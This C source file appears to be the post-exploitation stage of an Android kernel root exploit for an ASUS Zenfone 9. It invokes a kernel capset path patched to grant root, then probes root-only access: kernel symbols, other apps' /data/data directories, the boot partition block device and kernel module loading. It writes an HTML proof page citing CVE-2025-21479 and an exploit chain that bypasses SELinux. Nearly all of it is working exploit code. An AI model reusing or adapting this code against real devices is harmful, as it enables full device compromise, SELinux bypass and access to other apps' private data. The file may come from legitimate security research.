// call_capset.c — invoke the (patched) capset path and, if it grants root, gather the evidence
// IN-PROCESS (no exec: after rooting, exec is denied on this setup, so the proof must not depend on
// launching anything).
//   call_capset              -> print root evidence + write /sdcard/root-proof.html
//   call_capset <cmd> [args] -> attempt to exec a command while root (diagnostic path)
#include <stdio.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <fcntl.h>
#include <sys/wait.h>

static void first_line(const char *path, char *out, size_t n) {
    FILE *f = fopen(path, "r");
    if (!f) { snprintf(out, n, "(open failed: %s)", strerror(errno)); return; }
    if (!fgets(out, (int)n, f)) snprintf(out, n, "(read failed)");
    fclose(f);
    out[strcspn(out, "\n")] = 0;
}

static void cap_eff(char *out, size_t n) {
    FILE *f = fopen("/proc/self/status", "r");
    out[0] = 0;
    if (!f) { snprintf(out, n, "(no status)"); return; }
    char line[256];
    while (fgets(line, sizeof(line), f))
        if (!strncmp(line, "CapEff:", 7)) { snprintf(out, n, "%s", line + 7); break; }
    fclose(f);
    out[strcspn(out, "\n")] = 0;
}

static void list_dir(const char *path, char *out, size_t n) {
    out[0] = 0;
    DIR *d = opendir(path);
    if (!d) { snprintf(out, n, "(opendir failed: %s)", strerror(errno)); return; }
    struct dirent *e; size_t used = 0; int count = 0;
    while ((e = readdir(d)) && count < 6) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;
        int w = snprintf(out + used, n - used, "%s\n", e->d_name);
        if (w < 0 || (size_t)w >= n - used) break;
        used += (size_t)w; count++;
    }
    closedir(d);
    if (!used) snprintf(out, n, "(empty)");
}


static void probe(const char *what, int ok, int e) {
    printf("PROBE %-34s %s%s\n", what, ok ? "ALLOWED" : "DENIED", ok ? "" : (e ? strerror(e) : ""));
}

static void run_probes(void) {
    int fd, e;
    /* read a root-only file */
    errno = 0; fd = open("/proc/kallsyms", O_RDONLY); e = errno;
    probe("open /proc/kallsyms", fd >= 0, e); if (fd >= 0) close(fd);
    /* write inside /data (exec-allowed, writable) */
    errno = 0; fd = open("/data/local/tmp/reed-probe.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644); e = errno;
    probe("write /data/local/tmp", fd >= 0, e);
    if (fd >= 0) { write(fd, "x", 1); close(fd); }
    /* write through the sdcard FUSE layer */
    errno = 0; fd = open("/sdcard/reed-probe.txt", O_WRONLY|O_CREAT|O_TRUNC, 0644); e = errno;
    probe("write /sdcard (FUSE)", fd >= 0, e); if (fd >= 0) close(fd);
    /* open the GPU node (KernelSU/other tooling may want device nodes) */
    errno = 0; fd = open("/dev/kgsl-3d0", O_RDWR); e = errno;
    probe("open /dev/kgsl-3d0", fd >= 0, e); if (fd >= 0) close(fd);
    /* can we BLOCK device nodes? this is what writing a boot image would need */
    errno = 0; fd = open("/dev/block/by-name/boot_a", O_RDWR); e = errno;
    probe("open /dev/block/by-name/boot_a", fd >= 0, e); if (fd >= 0) close(fd);
    /* exec a system binary (fork+wait so we survive) */
    {
        pid_t pid = fork();
        if (pid == 0) { execl("/system/bin/id", "id", (char *)0); _exit(126); }
        int st = 0; waitpid(pid, &st, 0);
        probe("exec /system/bin/id", WIFEXITED(st) && WEXITSTATUS(st) == 0, 0);
    }
    /* THE KernelSU question: is module loading permitted at all?
     * init_module with a bogus image: EPERM/EACCES => blocked; ENOEXEC/EINVAL => permitted. */
    {
        static char junk[64];
        errno = 0;
        long r = syscall(__NR_init_module, junk, sizeof(junk), "");
        int err = errno;
        printf("PROBE %-34s rc=%ld errno=%d (%s) => %s\n", "init_module (bogus image)", r, err,
               strerror(err),
               (err == EPERM || err == EACCES) ? "BLOCKED (no late-load)"
                                               : "PERMITTED (late-load viable)");
    }
}

int main(int argc, char **argv) {
    long r = syscall(SYS_capset, (void *)0, (void *)0);
    int rooted = (getuid() == 0 || geteuid() == 0);

    printf("capset(NULL,NULL) -> %ld errno=%d (%s)\n", r, errno, strerror(errno));
    printf("uid=%d euid=%d gid=%d  %s\n", getuid(), geteuid(), getgid(),
           rooted ? "*** ROOT ***" : "(not root - kernel text not patched?)");
    if (!rooted) return 1;

    if (argc == 1) run_probes();          /* what can this rooted process actually do? */

    if (argc > 1) {                      /* diagnostic path: exec while root */
        execvp(argv[1], &argv[1]);
        perror("execvp (root)");
        return 2;
    }

    /* Root-only evidence, collected without launching anything: /proc/kallsyms is blocked by
     * kptr_restrict for an ordinary shell, and /data/data by DAC/SELinux. */
    char ks[256] = {0}, caps[128] = {0}, listing[2048] = {0};
    first_line("/proc/kallsyms", ks, sizeof(ks));
    cap_eff(caps, sizeof(caps));
    list_dir("/data/data", listing, sizeof(listing));

    printf("CapEff:%s\n", caps);
    printf("kallsyms[0]: %s\n", ks);
    printf("data/data:\n%s\n", listing);

    FILE *out = fopen("/sdcard/root-proof.html", "w");
    if (!out) out = fopen("/data/local/tmp/root-proof.html", "w");
    if (out) {
        fprintf(out,
            "<!doctype html><meta charset=utf-8><body style=\"background:#0b0f14;color:#d7ffe0;"
            "font-family:monospace;font-size:25px;padding:26px;line-height:1.45\">"
            "<div style=\"font-size:52px;color:#57ff8a;font-weight:bold\">&#10003; ROOT</div>"
            "<div style=\"color:#8ab4f8;margin-bottom:16px\">uid=0(root) &middot; SELinux enforcement "
            "bypassed in kernel text &middot; ASUS Zenfone 9 (AI2202)</div>"
            "<pre style=\"white-space:pre-wrap\">capset(NULL,NULL) -&gt; %ld"
            "\nuid=%d euid=%d gid=%d\nCapEff:%s\nkallsyms[0]: %s\n/data/data:\n%s</pre>"
            "<div style=\"color:#5f6b7a;margin-top:18px\">CVE-2025-21479 (GPU/SMMU) &rarr; perf PA leak "
            "&rarr; arbitrary physical R/W &rarr; text-only kernel patches</div></body>",
            r, getuid(), geteuid(), getgid(), caps, ks, listing);
        fclose(out);
        printf("wrote proof page\n");
    } else {
        printf("could not write proof page: %s\n", strerror(errno));
    }
    return 0;
}
